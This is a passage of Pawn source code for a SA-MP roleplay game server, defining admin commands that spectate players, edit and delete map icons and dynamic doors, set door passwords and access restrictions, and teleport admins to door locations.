			SetPVarInt(playerid, "SpecVW", GetPlayerVirtualWorld(playerid));
			if(IsPlayerInAnyVehicle(giveplayerid))
			{
				TogglePlayerSpectating(playerid, true);
				new carid = GetPlayerVehicleID(giveplayerid);
				PlayerSpectateVehicle(playerid, carid);
				SetPlayerInterior(playerid, GetPlayerInterior(giveplayerid));
				SetPlayerVirtualWorld(playerid, GetPlayerVirtualWorld(giveplayerid));
			}
			else
			{
				TogglePlayerSpectating(playerid, true);
				PlayerSpectatePlayer(playerid, giveplayerid);
				SetPlayerInterior(playerid, GetPlayerInterior(giveplayerid));
				SetPlayerVirtualWorld(playerid, GetPlayerVirtualWorld(giveplayerid));
			}
			GettingSpectated[giveplayerid] = playerid;
			Spectate[playerid] = giveplayerid;
			Spectating[playerid] = 1;
		}
		else
		{
			if(IsPlayerInAnyVehicle(giveplayerid))
			{
				TogglePlayerSpectating(playerid, true);
				new carid = GetPlayerVehicleID(giveplayerid);
				PlayerSpectateVehicle(playerid, carid);
				SetPlayerInterior(playerid, GetPlayerInterior(giveplayerid));
				SetPlayerVirtualWorld(playerid, GetPlayerVirtualWorld(giveplayerid));
			}
			else
			{
				TogglePlayerSpectating(playerid, true);
				PlayerSpectatePlayer(playerid, giveplayerid);
				SetPlayerInterior(playerid, GetPlayerInterior(giveplayerid));
				SetPlayerVirtualWorld(playerid, GetPlayerVirtualWorld(giveplayerid));
			}
			GettingSpectated[Spectate[playerid]] = 999;
			GettingSpectated[giveplayerid] = playerid;
			Spectate[playerid] = giveplayerid;
			Spectating[playerid] = 1;
		}
	}
	else
	{
		SendClientMessage(playerid, COLOR_WHITE, "Target is not available.");
	}
	return 1;
}

CMD:dmpedit(playerid, params[])
{
	if(PlayerInfo[playerid][pAdmin] < 6)
	{
		SendClientMessage(playerid, COLOR_GRAD2, "You're not authorized to use that command!");
		return 1;
	}

	new string[128], choice[32], mapiconid, amount;
	if(sscanf(params, "s[32]dD", choice, mapiconid, amount))
	{
		SendClientMessage(playerid, COLOR_WHITE, "USAGE: /dmpedit [name] [mapiconid] [(Optional)amount]");
		SendClientMessage(playerid, COLOR_GREY, "Available names: Position, MarkerType, Color, Delete");
		return 1;
	}

	if(mapiconid < 0 || mapiconid >= MAX_DMAPICONS)
	{
		SendClientMessage(playerid, COLOR_WHITE, "Invalid Map Icon ID!");
	}

	if(strcmp(choice, "position", true) == 0)
	{
		GetPlayerPos(playerid, DMPInfo[mapiconid][dmpPosX], DMPInfo[mapiconid][dmpPosY], DMPInfo[mapiconid][dmpPosZ]);
		DMPInfo[mapiconid][dmpInt] = GetPlayerInterior(playerid);
		DMPInfo[mapiconid][dmpVW] = GetPlayerVirtualWorld(playerid);
		SendClientMessage(playerid, COLOR_WHITE, "You have changed the position!");
		if(IsValidDynamicMapIcon(DMPInfo[mapiconid][dmpMapIconID])) DestroyDynamicMapIcon(DMPInfo[mapiconid][dmpMapIconID]);
		DMPInfo[mapiconid][dmpMapIconID] = CreateDynamicMapIcon(DMPInfo[mapiconid][dmpPosX], DMPInfo[mapiconid][dmpPosY], DMPInfo[mapiconid][dmpPosZ], DMPInfo[mapiconid][dmpMarkerType], DMPInfo[mapiconid][dmpColor], DMPInfo[mapiconid][dmpVW], DMPInfo[mapiconid][dmpInt], -1, 500.0);
		SaveDynamicMapIcons();
		format(string, sizeof(string), "%s has edited MapIconID %d's Position.", GetPlayerNameEx(playerid), mapiconid);
		Log("logs/dmpedit.log", string);
		return 1;
	}
	else if(strcmp(choice, "delete", true) == 0)
	{
		SendClientMessage(playerid, COLOR_WHITE, "You have deleted the map icon!");
		DMPInfo[mapiconid][dmpPosX] = 0.0;
		DMPInfo[mapiconid][dmpPosY] = 0.0;
		DMPInfo[mapiconid][dmpPosZ] = 0.0;
		DMPInfo[mapiconid][dmpVW] = 0;
		DMPInfo[mapiconid][dmpInt] = 0;
		DMPInfo[mapiconid][dmpMarkerType] = 0;
		DMPInfo[mapiconid][dmpColor] = 0;
		SaveDynamicMapIcons();
		if(IsValidDynamicMapIcon(DMPInfo[mapiconid][dmpMapIconID])) DestroyDynamicMapIcon(DMPInfo[mapiconid][dmpMapIconID]);
		format(string, sizeof(string), "%s has deleted MapIconID %d.", GetPlayerNameEx(playerid), mapiconid);
		Log("logs/dmpedit.log", string);
		return 1;

	}
	else if(strcmp(choice, "markertype", true) == 0)
	{
		DMPInfo[mapiconid][dmpMarkerType] = amount;
		format(string, sizeof(string), "You have set the marker type to %d.", amount);
		SendClientMessage(playerid, COLOR_WHITE, string);
		if(IsValidDynamicMapIcon(DMPInfo[mapiconid][dmpMapIconID])) DestroyDynamicMapIcon(DMPInfo[mapiconid][dmpMapIconID]);
		DMPInfo[mapiconid][dmpMapIconID] = CreateDynamicMapIcon(DMPInfo[mapiconid][dmpPosX], DMPInfo[mapiconid][dmpPosY], DMPInfo[mapiconid][dmpPosZ], DMPInfo[mapiconid][dmpMarkerType], DMPInfo[mapiconid][dmpColor], DMPInfo[mapiconid][dmpVW], DMPInfo[mapiconid][dmpInt], -1, 500.0);
		format(string, sizeof(string), "%s has edited MapIconID %d's Marker Type to %d.", GetPlayerNameEx(playerid), mapiconid, amount);
		Log("logs/dmpedit.log", string);
	}
	else if(strcmp(choice, "color", true) == 0)
	{
		DMPInfo[mapiconid][dmpColor] = amount;
		format(string, sizeof(string), "You have set the color to %d.", amount);
		SendClientMessage(playerid, COLOR_WHITE, string);
		if(IsValidDynamicMapIcon(DMPInfo[mapiconid][dmpMapIconID])) DestroyDynamicMapIcon(DMPInfo[mapiconid][dmpMapIconID]);
		DMPInfo[mapiconid][dmpMapIconID] = CreateDynamicMapIcon(DMPInfo[mapiconid][dmpPosX], DMPInfo[mapiconid][dmpPosY], DMPInfo[mapiconid][dmpPosZ], DMPInfo[mapiconid][dmpMarkerType], DMPInfo[mapiconid][dmpColor], DMPInfo[mapiconid][dmpVW], DMPInfo[mapiconid][dmpInt], -1, 500.0);
		format(string, sizeof(string), "%s has edited MapIconID %d's Color to %d.", GetPlayerNameEx(playerid), mapiconid, amount);
		Log("logs/dmpedit.log", string);
	}
	SaveDynamicMapIcons();
	return 1;
}

CMD:dmpnext(playerid, params[])
{
	if(PlayerInfo[playerid][pAdmin] >= 6)
	{
		SendClientMessage(playerid, COLOR_RED, "* Listing next available map icon...");
		for(new x;x<MAX_DMAPICONS;x++)
		{
		    if(DMPInfo[x][dmpMarkerType] == 0)
		    {
		        new string[128];
		        format(string, sizeof(string), "%d is available to use.", x);
		        SendClientMessage(playerid, COLOR_WHITE, string);
		        break;
			}
		}
	}
	else
	{
	    SendClientMessage(playerid, COLOR_GRAD2, "You're not authorized to use that command!");
		return 1;
	}
	return 1;
}

CMD:dmpnear(playerid, params[])
{
    if(PlayerInfo[playerid][pAdmin] >= 6)
	{
		SendClientMessage(playerid, COLOR_RED, "* Listing all map icons within 30 meters of you");
		new Float:X, Float:Y, Float:Z;
  		GetPlayerPos(playerid, X, Y, Z);
		for(new i;i<MAX_DMAPICONS;i++)
		{
			if(IsPlayerInRangeOfPoint(playerid, 30, DMPInfo[i][dmpPosX], DMPInfo[i][dmpPosY], DMPInfo[i][dmpPosZ]))
			{
				if(DMPInfo[i][dmpMarkerType] != 0)
				{
				    new string[128];
			    	format(string, sizeof(string), "MapIcon ID %d | %f from you", i, GetDistance(DMPInfo[i][dmpPosX], DMPInfo[i][dmpPosY], DMPInfo[i][dmpPosZ], X, Y, Z));
			    	SendClientMessage(playerid, COLOR_WHITE, string);
				}
			}
		}
	}
	else
	{
	    SendClientMessage(playerid, COLOR_GRAD2, "You're not authorized to use that command!");
	}
	return 1;
}

CMD:gotodmp(playerid, params[])
{
	if(PlayerInfo[playerid][pAdmin] < 6)
	{
		SendClientMessage(playerid, COLOR_GRAD2, "You're not authorized to use this command!");
		return 1;
	}

	new mapiconid;
	if(sscanf(params, "d", mapiconid)) return SendClientMessage(playerid, COLOR_WHITE, "USAGE: /gotodmp [mapiconid]");

	if(mapiconid >= MAX_DMAPICONS || mapiconid < 0)
	{
		SendClientMessage(playerid, COLOR_GRAD2, "USAGE: /gotodmp [mapiconid]");
		return 1;
	}
	SetPlayerPos(playerid, DMPInfo[mapiconid][dmpPosX], DMPInfo[mapiconid][dmpPosY], DMPInfo[mapiconid][dmpPosZ]);
	SetPlayerVirtualWorld(playerid, DMPInfo[mapiconid][dmpVW]);
	SetPlayerInterior(playerid, DMPInfo[mapiconid][dmpInt]);
	return 1;
}

CMD:ddnear(playerid, params[])
{
    if(PlayerInfo[playerid][pAdmin] >= 4)
	{
		if(AdminDuty[playerid] != 1 && PlayerInfo[playerid][pAdmin] < 6)
	    {
	        SendClientMessage(playerid,COLOR_WHITE, "You're not on-duty as admin. To access your admin commands you must be on-duty. Type /aduty to go on-duty.");
			return 1;
	    }
		SendClientMessage(playerid, COLOR_RED, "* Listing all dynamic doors within 15 meters of you");
		new Float:X, Float:Y, Float:Z;
  		GetPlayerPos(playerid, X, Y, Z);
		for(new i;i<MAX_DDOORS;i++)
		{
  			 if(IsPlayerInRangeOfPoint(playerid, 15, DDoorsInfo[i][ddExteriorX], DDoorsInfo[i][ddExteriorY], DDoorsInfo[i][ddExteriorZ]))
			{
				if(DDoorsInfo[i][ddDescription] != 0)
				{
				    new string[128];
			    	format(string, sizeof(string), "DynamicDoor ID %d | %f from you", i, GetDistance(DDoorsInfo[i][ddExteriorX], DDoorsInfo[i][ddExteriorY], DDoorsInfo[i][ddExteriorZ], X, Y, Z));
			    	SendClientMessage(playerid, COLOR_WHITE, string);
				}
			}
		}
	}
	else
	{
	    SendClientMessage(playerid, COLOR_GRAD2, "You're not authorized to use that command!");
	}
	return 1;
}

CMD:ddedit(playerid, params[])
{
	if(PlayerInfo[playerid][pAdmin] < 4)
	{
		SendClientMessage(playerid, COLOR_GRAD2, "You're not authorized to use that command!");
		return 1;
	}
	if(AdminDuty[playerid] != 1 && PlayerInfo[playerid][pAdmin] < 6)
 	{
  		SendClientMessage(playerid,COLOR_WHITE, "You're not on-duty as admin. To access your admin commands you must be on-duty. Type /aduty to go on-duty.");
		return 1;
   }

	new string[128], choice[32], doorid, amount;
	if(sscanf(params, "s[32]dD(1)", choice, doorid, amount))
	{
		SendClientMessage(playerid, COLOR_WHITE, "USAGE: /ddedit [name] [doorid] [amount]");
		SendClientMessage(playerid, COLOR_GREY, "Available names: Exterior, Interior, CustomInterior, CustomExterior, VIP");
		SendClientMessage(playerid, COLOR_GREY, "Gang, Faction, Wanted, Admin, VehicleAble, Color, PickupModel, Delete");
		if(PlayerInfo[playerid][pAdmin] >= 6)
		{
			SendClientMessage(playerid, COLOR_GREY, "NotEditable");
		}
		return 1;
	}

	if(doorid >= MAX_DDOORS)
	{
		SendClientMessage(playerid, COLOR_WHITE, "Invalid Door ID!");
		return 1;
	}

	if(strcmp(choice, "noteditable", true) == 0)
	{
	    if(PlayerInfo[playerid][pAdmin] >= 6)
	    {
			if(DDoorsInfo[doorid][ddNotEditable] == 0)
			{
				DDoorsInfo[doorid][ddNotEditable] = 1;
				SendClientMessage(playerid, COLOR_WHITE, "Door set to not editable (can no longer be edited)!");
		    }
			else
			{
				DDoorsInfo[doorid][ddNotEditable] = 0;
				SendClientMessage(playerid, COLOR_WHITE, "Door set to editable (can be edited again)!");
			}
			SaveDynamicDoors();
			format(string, sizeof(string), "%s has edited DoorID %d's NotEditable.", GetPlayerNameEx(playerid), doorid);
			Log("logs/ddedit.log", string);
		}
		return 1;
	}

	if(DDoorsInfo[doorid][ddNotEditable] == 1)
	{
	    SendClientMessage(playerid, COLOR_WHITE, "This door has been set to non-editable by a Level 6 Admin, contact them if you wish to make any changes.");
	    return 1;
	}

	if(strcmp(choice, "interior", true) == 0)
	{
		GetPlayerPos(playerid, DDoorsInfo[doorid][ddInteriorX], DDoorsInfo[doorid][ddInteriorY], DDoorsInfo[doorid][ddInteriorZ]);
		GetPlayerFacingAngle(playerid, DDoorsInfo[doorid][ddInteriorA]);
		DDoorsInfo[doorid][ddInteriorInt] = GetPlayerInterior(playerid);
		DDoorsInfo[doorid][ddInteriorVW] = GetPlayerVirtualWorld(playerid);
		SendClientMessage(playerid, COLOR_WHITE, "You have changed the interior!");
		SaveDynamicDoors();
		format(string, sizeof(string), "%s has edited DoorID %d's Interior.", GetPlayerNameEx(playerid), doorid);
		Log("logs/ddedit.log", string);
		return 1;
	}
	else if(strcmp(choice, "custominterior", true) == 0)
	{
		if(DDoorsInfo[doorid][ddCustomInterior] == 0)
		{
			DDoorsInfo[doorid][ddCustomInterior] = 1;
			SendClientMessage(playerid, COLOR_WHITE, "Door set to custom interior!");
		}
		else
		{
			DDoorsInfo[doorid][ddCustomInterior] = 0;
			SendClientMessage(playerid, COLOR_WHITE, "Door set to normal (not custom) interior!");
		}
		SaveDynamicDoors();
		format(string, sizeof(string), "%s has edited DoorID %d's CustomInterior.", GetPlayerNameEx(playerid), doorid);
		Log("logs/ddedit.log", string);
		return 1;
	}
	else if(strcmp(choice, "customexterior", true) == 0)
	{
		if(DDoorsInfo[doorid][ddCustomExterior] == 0)
		{
			DDoorsInfo[doorid][ddCustomExterior] = 1;
			SendClientMessage(playerid, COLOR_WHITE, "Door set to custom exterior!");
		}
		else
		{
			DDoorsInfo[doorid][ddCustomExterior] = 0;
			SendClientMessage(playerid, COLOR_WHITE, "Door set to normal (not custom) exterior!");
		}
		SaveDynamicDoors();
		format(string, sizeof(string), "%s has edited DoorID %d's CustomExterior.", GetPlayerNameEx(playerid), doorid);
		Log("logs/ddedit.log", string);
		return 1;
	}
	else if(strcmp(choice, "exterior", true) == 0)
	{
		GetPlayerPos(playerid, DDoorsInfo[doorid][ddExteriorX], DDoorsInfo[doorid][ddExteriorY], DDoorsInfo[doorid][ddExteriorZ]);
		GetPlayerFacingAngle(playerid, DDoorsInfo[doorid][ddExteriorA]);
		DDoorsInfo[doorid][ddExteriorVW] = GetPlayerVirtualWorld(playerid);
		DDoorsInfo[doorid][ddExteriorInt] = GetPlayerInterior(playerid);
		SendClientMessage(playerid, COLOR_WHITE, "You have changed the exterior!");
		//if(IsValidDynamicPickup(DDoorsInfo[doorid][ddPickupID])) DestroyPickup(DDoorsInfo[doorid][ddPickupID]);
		DestroyPickup(DDoorsInfo[doorid][ddPickupID]);
		if(IsValidDynamic3DTextLabel(DDoorsInfo[doorid][ddTextID])) DestroyDynamic3DTextLabel(DDoorsInfo[doorid][ddTextID]);
		CreateDynamicDoor(doorid);
		SaveDynamicDoors();
		format(string, sizeof(string), "%s has edited DoorID %d's Exterior.", GetPlayerNameEx(playerid), doorid);
		Log("logs/ddedit.log", string);
	}
	else if(strcmp(choice, "vip", true) == 0)
	{
		DDoorsInfo[doorid][ddVIP] = amount;

		format(string, sizeof(string), "You have changed the VIP Level to %d.", amount);
		SendClientMessage(playerid, COLOR_WHITE, string);

		SaveDynamicDoors();
		format(string, sizeof(string), "%s has edited DoorID %d's VIP Level.", GetPlayerNameEx(playerid), doorid);
		Log("logs/ddedit.log", string);
		return 1;
	}
	else if(strcmp(choice, "gang", true) == 0)
	{
		DDoorsInfo[doorid][ddGang] = amount;

		format(string, sizeof(string), "You have changed the Family to %d.", amount);
		SendClientMessage(playerid, COLOR_WHITE, string);

		SaveDynamicDoors();
		format(string, sizeof(string), "%s has edited DoorID %d's Family.", GetPlayerNameEx(playerid), doorid);
		Log("logs/ddedit.log", string);
		return 1;
	}
	else if(strcmp(choice, "faction", true) == 0)
	{
		DDoorsInfo[doorid][ddFaction] = amount;

		format(string, sizeof(string), "You have changed the Faction to %d.", amount);
		SendClientMessage(playerid, COLOR_WHITE, string);

		SaveDynamicDoors();
		format(string, sizeof(string), "%s has edited DoorID %d's Faction.", GetPlayerNameEx(playerid), doorid);
		Log("logs/ddedit.log", string);
		return 1;
	}
	else if(strcmp(choice, "admin", true) == 0)
	{
		DDoorsInfo[doorid][ddAdmin] = amount;

		format(string, sizeof(string), "You have changed the Admin Level to %d.", amount);
		SendClientMessage(playerid, COLOR_WHITE, string);

		SaveDynamicDoors();
		format(string, sizeof(string), "%s has edited DoorID %d's Admin Level.", GetPlayerNameEx(playerid), doorid);
		Log("logs/ddedit.log", string);
		return 1;
	}
	else if(strcmp(choice, "wanted", true) == 0)
	{
		DDoorsInfo[doorid][ddWanted] = amount;

		format(string, sizeof(string), "You have changed the Wanted to %d.", amount);
		SendClientMessage(playerid, COLOR_WHITE, string);

		SaveDynamicDoors();
		format(string, sizeof(string), "%s has edited DoorID %d's Wanted.", GetPlayerNameEx(playerid), doorid);
		Log("logs/ddedit.log", string);
		return 1;
	}
	else if(strcmp(choice, "vehicleable", true) == 0)
	{
		DDoorsInfo[doorid][ddVehicleAble] = amount;

		format(string, sizeof(string), "You have changed the VehicleAble to %d.", amount);
		SendClientMessage(playerid, COLOR_WHITE, string);

		SaveDynamicDoors();
		format(string, sizeof(string), "%s has edited DoorID %d's VehicleAble.", GetPlayerNameEx(playerid), doorid);
		Log("logs/ddedit.log", string);
		return 1;
	}
	else if(strcmp(choice, "color", true) == 0)
	{
		DDoorsInfo[doorid][ddColor] = amount;

		format(string, sizeof(string), "You have changed the Color to %d.", amount);
		SendClientMessage(playerid, COLOR_WHITE, string);

		//if(IsValidDynamicPickup(DDoorsInfo[doorid][ddPickupID])) DestroyPickup(DDoorsInfo[doorid][ddPickupID]);
		DestroyPickup(DDoorsInfo[doorid][ddPickupID]);
		if(IsValidDynamic3DTextLabel(DDoorsInfo[doorid][ddTextID])) DestroyDynamic3DTextLabel(DDoorsInfo[doorid][ddTextID]);
		CreateDynamicDoor(doorid);

		SaveDynamicDoors();
		format(string, sizeof(string), "%s has edited DoorID %d's Color.", GetPlayerNameEx(playerid), doorid);
		Log("logs/ddedit.log", string);
		return 1;
	}
	else if(strcmp(choice, "pickupmodel", true) == 0)
	{
		DDoorsInfo[doorid][ddPickupModel] = amount;

		format(string, sizeof(string), "You have changed the PickupModel to %d.", amount);
		SendClientMessage(playerid, COLOR_WHITE, string);

		//if(IsValidDynamicPickup(DDoorsInfo[doorid][ddPickupID])) DestroyPickup(DDoorsInfo[doorid][ddPickupID]);
		DestroyPickup(DDoorsInfo[doorid][ddPickupID]);
		if(IsValidDynamic3DTextLabel(DDoorsInfo[doorid][ddTextID])) DestroyDynamic3DTextLabel(DDoorsInfo[doorid][ddTextID]);
		CreateDynamicDoor(doorid);

		SaveDynamicDoors();
		format(string, sizeof(string), "%s has edited DoorID %d's PickupModel.", GetPlayerNameEx(playerid), doorid);
		Log("logs/ddedit.log", string);
		return 1;
	}
	else if(strcmp(choice, "delete", true) == 0)
	{
	    if(DDoorsInfo[doorid][ddDescription] == 0) {
	        format(string, sizeof(string), "DoorID %d does not exist.", doorid);
			SendClientMessage(playerid, COLOR_WHITE, string);
			return 1;
	    }
    	//if(IsValidDynamicPickup(DDoorsInfo[doorid][ddPickupID])) DestroyPickup(DDoorsInfo[doorid][ddPickupID]);
    	DestroyPickup(DDoorsInfo[doorid][ddPickupID]);
	    DestroyDynamic3DTextLabel(DDoorsInfo[doorid][ddTextID]);
		DDoorsInfo[doorid][ddDescription] = 0;
		DDoorsInfo[doorid][ddCustomInterior] = 0;
		DDoorsInfo[doorid][ddExteriorVW] = 0;
		DDoorsInfo[doorid][ddExteriorInt] = 0;
		DDoorsInfo[doorid][ddInteriorVW] = 0;
		DDoorsInfo[doorid][ddInteriorInt] = 0;
		DDoorsInfo[doorid][ddExteriorX] = 0;
		DDoorsInfo[doorid][ddExteriorY] = 0;
		DDoorsInfo[doorid][ddExteriorZ] = 0;
		DDoorsInfo[doorid][ddExteriorA] = 0;
		DDoorsInfo[doorid][ddInteriorX] = 0;
		DDoorsInfo[doorid][ddInteriorY] = 0;
		DDoorsInfo[doorid][ddInteriorZ] = 0;
		DDoorsInfo[doorid][ddInteriorA] = 0;
		DDoorsInfo[doorid][ddCustomExterior] = 0;
		DDoorsInfo[doorid][ddVIP] = 0;
		DDoorsInfo[doorid][ddGang] = 0;
		DDoorsInfo[doorid][ddFaction] = 0;
		DDoorsInfo[doorid][ddAdmin] = 0;
		DDoorsInfo[doorid][ddWanted] = 0;
		DDoorsInfo[doorid][ddVehicleAble] = 0;
		DDoorsInfo[doorid][ddColor] = 0;
		DDoorsInfo[doorid][ddPass] = 0;
		DDoorsInfo[doorid][ddLocked] = 0;
		DDoorsInfo[doorid][ddNotEditable] = 0;
		SaveDynamicDoors();
		format(string, sizeof(string), "You have deleted DoorID %d.", doorid);
		SendClientMessage(playerid, COLOR_WHITE, string);
		format(string, sizeof(string), "%s has deleted DoorID %d.", GetPlayerNameEx(playerid), doorid);
		Log("logs/ddedit.log", string);
		return 1;
	}
	return 1;
}

CMD:ddnext(playerid, params[])
{
    if(PlayerInfo[playerid][pAdmin] >= 4)
	{
		if(AdminDuty[playerid] != 1 && PlayerInfo[playerid][pAdmin] < 6)
	    {
	        SendClientMessage(playerid,COLOR_WHITE, "You're not on-duty as admin. To access your admin commands you must be on-duty. Type /aduty to go on-duty.");
			return 1;
	    }
		SendClientMessage(playerid, COLOR_RED, "* Listing next available dynamic door...");
		for(new x;x<MAX_DDOORS;x++)
		{
		    if(DDoorsInfo[x][ddDescription] == 0)
		    {
		        new string[128];
		        format(string, sizeof(string), "%d is available to use.", x);
		        SendClientMessage(playerid, COLOR_WHITE, string);
		        break;
			}
		}
	}
	else
	{
	    SendClientMessage(playerid, COLOR_GRAD2, "You're not authorized to use that command!");
		return 1;
	}
	return 1;
}

CMD:ddname(playerid, params[])
{
	if(PlayerInfo[playerid][pAdmin] < 4)
	{
		SendClientMessage(playerid, COLOR_GRAD2, "You're not authorized to use that command!");
		return 1;
	}
	if(AdminDuty[playerid] != 1 && PlayerInfo[playerid][pAdmin] < 6)
 	{
  		SendClientMessage(playerid,COLOR_WHITE, "You're not on-duty as admin. To access your admin commands you must be on-duty. Type /aduty to go on-duty.");
		return 1;
	}

	new string[128], doorid, doorname[128];

	if(sscanf(params, "ds[128]", doorid, doorname)) return SendClientMessage(playerid, COLOR_WHITE, "USAGE: /ddname [doorid] [name]");

	if(DDoorsInfo[doorid][ddNotEditable] == 1)
	{
	    SendClientMessage(playerid, COLOR_WHITE, "This door has been set to non-editable by a Level 6 Admin, contact them if you wish to make any changes.");
	    return 1;
	}

	format(DDoorsInfo[doorid][ddDescription], 128, "%s", doorname);
	SendClientMessage(playerid, COLOR_WHITE, "You have changed the name of the door!");
	//if(IsValidDynamicPickup(DDoorsInfo[doorid][ddPickupID])) DestroyPickup(DDoorsInfo[doorid][ddPickupID]);
	DestroyPickup(DDoorsInfo[doorid][ddPickupID]);
	if(IsValidDynamic3DTextLabel(DDoorsInfo[doorid][ddTextID])) DestroyDynamic3DTextLabel(DDoorsInfo[doorid][ddTextID]);
	CreateDynamicDoor(doorid);
	SaveDynamicDoors();

	format(string, sizeof(string), "%s has edited DoorID %d's Name to %s.", GetPlayerNameEx(playerid), doorid, doorname);
	Log("logs/ddedit.log", string);
	return 1;
}

CMD:lockdoor(playerid, params[])
{
    for(new i = 0; i < sizeof(DDoorsInfo); i++) {
        if(IsPlayerInRangeOfPoint(playerid,3.0,DDoorsInfo[i][ddExteriorX], DDoorsInfo[i][ddExteriorY], DDoorsInfo[i][ddExteriorZ]) && PlayerInfo[playerid][pVW] == DDoorsInfo[i][ddExteriorVW] || IsPlayerInRangeOfPoint(playerid,3.0,DDoorsInfo[i][ddInteriorX], DDoorsInfo[i][ddInteriorY], DDoorsInfo[i][ddInteriorZ]) && PlayerInfo[playerid][pVW] == DDoorsInfo[i][ddInteriorVW]) {
        	if(DDoorsInfo[i][ddPass] < 1)
                return SendClientMessage(playerid, COLOR_GREY, "This door isn't allowed to be locked");
         	if(strcmp(DDoorsInfo[i][ddPass], "None", true) == 0)
                return SendClientMessage(playerid, COLOR_GREY, "This door isn't allowed to be locked");

			ShowPlayerDialogEx(playerid, DOORLOCK, DIALOG_STYLE_INPUT, "Door Security","Enter the password for this door","Login","Cancel");
			SetPVarInt(playerid, "Door", i);
		}
	}
	return 1;
}

CMD:ddpass(playerid, params[])
{
	if(PlayerInfo[playerid][pAdmin] < 5)
		return SendClientMessage(playerid, COLOR_GRAD2, "You're not authorized to use that command!");

	if(AdminDuty[playerid] != 1 && PlayerInfo[playerid][pAdmin] < 6)
 	{
  		SendClientMessage(playerid,COLOR_WHITE, "You're not on-duty as admin. To access your admin commands you must be on-duty. Type /aduty to go on-duty.");
		return 1;
	}

	new string[128],
		doorid,
		doorpass[24];

	if(sscanf(params, "ds[24]", doorid, doorpass)) { SendClientMessage(playerid, COLOR_WHITE, "USAGE: /ddpass [doorid] [pass]"); SendClientMessage(playerid, COLOR_WHITE, "To remove the password on the door set the password to 'none' "); return 1; }


	if(DDoorsInfo[doorid][ddNotEditable] == 1)
	{
	    SendClientMessage(playerid, COLOR_WHITE, "This door has been set to non-editable by a Level 6 Admin, contact them if you wish to make any changes.");
	    return 1;
	}

	format(DDoorsInfo[doorid][ddPass], 24, "%s", doorpass);
	SendClientMessage(playerid, COLOR_WHITE, "You have changed the password of that door.");
	SaveDynamicDoors();
	format(string, sizeof(string), "%s has edited DoorID %d's password to %s.", GetPlayerNameEx(playerid), doorid, doorpass);
	Log("logs/ddedit.log", string);
	return 1;
}

CMD:goindoor(playerid, params[])
{
	if(PlayerInfo[playerid][pAdmin] >= 4)
	{
		if(AdminDuty[playerid] != 1 && PlayerInfo[playerid][pAdmin] < 6)
	    {
	        SendClientMessage(playerid,COLOR_WHITE, "You're not on-duty as admin. To access your admin commands you must be on-duty. Type /aduty to go on-duty.");
			return 1;
	    }
		new doornum;
		if(sscanf(params, "d", doornum)) return SendClientMessage(playerid, COLOR_WHITE, "USAGE: /goindoor [doornumber]");

		Streamer_UpdateEx(playerid, DDoorsInfo[doornum][ddInteriorX],DDoorsInfo[doornum][ddInteriorY],DDoorsInfo[doornum][ddInteriorZ]);
		SetPlayerInterior(playerid,DDoorsInfo[doornum][ddInteriorInt]);
		SetPlayerPos(playerid,DDoorsInfo[doornum][ddInteriorX],DDoorsInfo[doornum][ddInteriorY],DDoorsInfo[doornum][ddInteriorZ]);
		SetPlayerFacingAngle(playerid,DDoorsInfo[doornum][ddInteriorA]);
		if(DDoorsInfo[doornum][ddCustomInterior])
		{
			LoadObjectsForPlayer(playerid);
		}
		PlayerInfo[playerid][pInt] = DDoorsInfo[doornum][ddInteriorInt];
		PlayerInfo[playerid][pVW] = DDoorsInfo[doornum][ddInteriorVW];
		SetPlayerVirtualWorld(playerid, DDoorsInfo[doornum][ddInteriorVW]);
	}
	return 1;
}

CMD:gotodoor(playerid, params[])
{
	if(PlayerInfo[playerid][pAdmin] >= 4)
	{
		if(AdminDuty[playerid] != 1 && PlayerInfo[playerid][pAdmin] < 6)
	    {
	        SendClientMessage(playerid,COLOR_WHITE, "You're not on-duty as admin. To access your admin commands you must be on-duty. Type /aduty to go on-duty.");
			return 1;
	    }
		new doornum;
		if(sscanf(params, "d", doornum)) return SendClientMessage(playerid, COLOR_WHITE, "USAGE: /gotodoor [doornumber]");

		Streamer_UpdateEx(playerid, DDoorsInfo[doornum][ddExteriorX],DDoorsInfo[doornum][ddExteriorY],DDoorsInfo[doornum][ddExteriorZ]);
		if(DDoorsInfo[doornum][ddCustomExterior])
		{
			LoadObjectsForPlayer(playerid);
		}
		SetPlayerInterior(playerid,DDoorsInfo[doornum][ddExteriorInt]);
		SetPlayerPos(playerid,DDoorsInfo[doornum][ddExteriorX],DDoorsInfo[doornum][ddExteriorY],DDoorsInfo[doornum][ddExteriorZ]);
		SetPlayerFacingAngle(playerid,DDoorsInfo[doornum][ddExteriorA]);
		PlayerInfo[playerid][pInt] = DDoorsInfo[doornum][ddExteriorInt];
		SetPlayerVirtualWorld(playerid, DDoorsInfo[doornum][ddExteriorVW]);
		PlayerInfo[playerid][pVW] = DDoorsInfo[doornum][ddExteriorVW];
	}
	return 1;
}

CMD:enter(playerid, params[])
{
    if(GetPVarInt(playerid, "PBM") > 0) {
        SendClientMessage(playerid, COLOR_WHITE, "You can't do this while being in a arena!");
        return 1;
    }
    if(PlayerCuffed[playerid] >= 1)
	{
        SendClientMessage(playerid, COLOR_WHITE, "You can't do this right now.");
        return 1;
    }
    if(PlayerInfo[playerid][pJailed] > 0)
	{
        SendClientMessage(playerid, COLOR_WHITE, "You can't do this right now.");
        return 1;
    }

	new string[128];
    for(new i = 0; i < sizeof(DDoorsInfo); i++)
	{
        if(IsPlayerInRangeOfPoint(playerid,3.0,DDoorsInfo[i][ddExteriorX], DDoorsInfo[i][ddExteriorY], DDoorsInfo[i][ddExteriorZ]) && PlayerInfo[playerid][pVW] == DDoorsInfo[i][ddExteriorVW])
		{
            if(DDoorsInfo[i][ddVIP] > 0 && PlayerInfo[playerid][pVip] < DDoorsInfo[i][ddVIP]) {
                SendClientMessage(playerid, COLOR_GRAD2, "You can't enter, you're not a high enough VIP level.");
                return 1;
            }

            if(DDoorsInfo[i][ddGang] > 0) {
                if(PlayerInfo[playerid][pGang] != DDoorsInfo[i][ddGang]) {
                    SendClientMessage(playerid, COLOR_GRAD2, "You can't enter, this door is gang restricted.");
                    return 1;
                }
            }

            if(DDoorsInfo[i][ddFaction] > 0 && DDoorsInfo[i][ddFaction] != 1337) {
				if(PlayerInfo[playerid][pFaction] != DDoorsInfo[i][ddFaction])
				{
					SendClientMessage(playerid, COLOR_GRAD2, "You can't enter, this door is faction restricted.");
					return 1;
				}
            }

			if(DDoorsInfo[i][ddFaction] == 1337) {
				if(!IsACop(playerid) || PlayerInfo[playerid][pFaction] != 5)
				{
					SendClientMessage(playerid, COLOR_GRAD2, "You can't enter, this door is faction restricted.");
					return 1;
				}
            }

